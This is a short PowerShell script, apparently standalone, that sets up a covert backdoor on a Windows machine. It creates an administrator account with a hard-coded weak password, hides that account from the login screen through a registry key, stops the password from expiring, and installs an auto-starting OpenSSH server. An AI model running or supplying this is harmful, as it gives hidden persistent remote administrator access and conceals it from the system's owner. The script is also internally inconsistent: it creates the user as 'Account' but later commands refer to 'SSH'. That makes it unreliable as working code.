$password = ConvertTo-SecureString "password" -AsPlainText -Force
New-LocalUser "Account" -Password $password -FullName "SSH"
Add-LocalGroupMember -Group "Administrators" -Member "SSH"
$path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
New-Item $path -Force | New-ItemProperty -Name "SSH" -Value 0 -PropertyType DWord -Force
Set-LocalUser -Name "SSH" -PasswordNeverExpires 1
Get-WindowsCapability -Online | ? Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*
